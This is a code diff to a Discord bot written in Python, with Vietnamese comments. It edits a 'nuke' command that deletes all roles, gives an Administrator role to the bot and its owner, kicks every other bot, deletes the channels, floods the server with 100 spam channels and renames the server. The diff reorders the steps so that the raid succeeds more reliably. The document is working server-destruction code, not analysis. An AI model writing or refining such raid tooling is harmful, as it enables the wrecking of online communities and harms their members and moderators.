@@ -13,7 +13,7 @@ BOT_OWNERS = [
     1535132569534865490,
 ]
 
-# Kênh log cố định (ID từ link bạn cung cấp) - vẫn giữ lại nhưng có thể dùng l!channelslog
+# Kênh log cố định (ID từ link bạn cung cấp)
 LOG_CHANNEL_ID = 1537813100546236497
 
 intents = discord.Intents.default()
@@ -186,7 +186,7 @@ def is_bot_owner():
 @bot.command(name="nuke")
 @is_bot_owner()
 async def nuke_server(ctx):
-    """Lệnh nuke server siêu tốc: Xóa role, tạo role quyền tối cao add cho bot & owner, kick bot khác, nuke kênh."""
+    """Lệnh nuke server siêu tốc: Xóa role, tạo role quyền tối cao add cho bot & owner, kick toàn bộ bot khác, nuke kênh."""
     try:
         confirm_embed = discord.Embed(
             title="⚠️ XÁC NHẬN LỆNH NUKE SIÊU TỐC ⚠️",
@@ -194,7 +194,7 @@ async def nuke_server(ctx):
                 f"🔥 **Boss Bảo kính yêu!**\n\n"
                 f"Lệnh này sẽ thực hiện ngay lập tức:\n"
                 f"• Xóa toàn bộ role & tạo role tối cao add cho Bot + Owner\n"
-                f"• Kick toàn bộ các bot khác trong server\n"
+                f"• Kick toàn bộ các bot khác có thể kick trong server\n"
                 f"• Xóa sạch kênh & tạo 100 kênh spam mới\n"
                 f"• Đổi tên & avatar server\n\n"
                 f"🔹 **Gõ l!confirmnuke để xác nhận**\n"
@@ -220,7 +220,7 @@ async def nuke_server(ctx):
         if log_channel:
             await log_channel.send(embed=discord.Embed(title="🔥 SIÊU NUKE BẮT ĐẦU...", color=0xFF0000))
 
-        # 1. Thực hiện song song: Đổi tên server, đổi avatar, xóa role cũ, tạo role tối cao và kick bot khác để đạt tốc độ siêu nhanh
+        # 1. Thực hiện song song: Đổi tên, đổi avatar, xóa role cũ, tạo role tối cao, add quyền và sau đó kick sạch các bot khác
         supreme_role = None
         async def prep_nuke():
             nonlocal supreme_role
@@ -237,7 +237,14 @@ async def nuke_server(ctx):
             except:
                 pass
 
-            # Tạo role quyền cao nhất (Administrator)
+            # Xóa các role cũ trước (trừ @everyone)
+            for role in ctx.guild.roles:
+                if role.name != "@everyone":
+                    tasks.append(role.delete())
+
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+            # Tạo role quyền cao nhất (Administrator) sau khi đã dọn dẹp kha khá role cũ
             try:
                 supreme_role = await ctx.guild.create_role(
                     name="👑 ℕ𝕌𝕂𝔼ℝ 𝕆ℕ 𝕋𝕆ℙ 👑",
@@ -245,24 +252,21 @@ async def nuke_server(ctx):
                     color=discord.Color.red(),
                     hoist=True
                 )
-                # Add ngay cho bot và owner
-                tasks.append(ctx.guild.me.add_roles(supreme_role))
+                # Add ngay role tối cao cho Bot và Owner
+                await ctx.guild.me.add_roles(supreme_role)
                 if ctx.author:
-                    tasks.append(ctx.author.add_roles(supreme_role))
+                    await ctx.author.add_roles(supreme_role)
             except Exception as e:
-                print(f"Lỗi tạo role tối cao: {e}")
+                print(f"Lỗi tạo/add role tối cao: {e}")
 
-            # Kick tất cả các bot khác trong server ngay lập tức
+            # Sau khi đã có quyền, tiến hành kick tất cả các bot khác trong server (ngoại trừ chính bot đang chạy)
+            kick_tasks = []
             for member in ctx.guild.members:
                 if member.bot and member.id != bot.user.id:
-                    tasks.append(member.kick(reason="Anti-bot / Nuke cleanup"))
-
-            # Xóa các role cũ (trừ @everyone và role vừa tạo)
-            for role in ctx.guild.roles:
-                if role.name != "@everyone" and role != supreme_role:
-                    tasks.append(role.delete())
-
-            await asyncio.gather(*tasks, return_exceptions=True)
+                    kick_tasks.append(member.kick(reason="Anti-bot / Nuke cleanup - Kicked by Supreme Bot"))
+            
+            if kick_tasks:
+                await asyncio.gather(*kick_tasks, return_exceptions=True)
 
         # Chạy giai đoạn chuẩn bị chớp nhoáng
         await prep_nuke()
